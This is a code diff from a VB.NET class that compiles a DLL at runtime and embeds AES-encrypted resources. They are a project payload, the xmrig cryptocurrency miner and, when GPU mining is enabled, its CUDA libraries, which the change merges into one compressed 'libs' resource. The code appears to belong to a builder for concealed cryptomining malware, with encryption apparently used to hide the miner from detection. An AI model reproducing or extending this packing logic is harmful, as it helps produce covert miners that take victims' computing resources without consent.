@@ -27,6 +27,8 @@ Public Class Codedom
             .ReferencedAssemblies.Add("system.dll")
             .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
+            .ReferencedAssemblies.Add("System.IO.Compression.dll")
+            .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")
 
             F.txtLog.Text = F.txtLog.Text + ("Creating a DLL..." + vbNewLine)
 
@@ -34,9 +36,7 @@ Public Class Codedom
                 R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
                 R.AddResource(F.Resources_xmr, AES_Encryptor(My.Resources.xmrig))
                 If (F.toggleEnableGPU.Checked) Then
-                    R.AddResource(F.Resources_cuda1, AES_Encryptor(My.Resources.xmrig_cuda))
-                    R.AddResource(F.Resources_cuda2, AES_Encryptor(My.Resources.nvrtc64_101_0))
-                    R.AddResource(F.Resources_cuda3, AES_Encryptor(My.Resources.nvrtc_builtins64_101))
+                    R.AddResource(F.Resources_libs, AES_Encryptor(My.Resources.libs))
                 End If
                 R.Generate()
             End Using
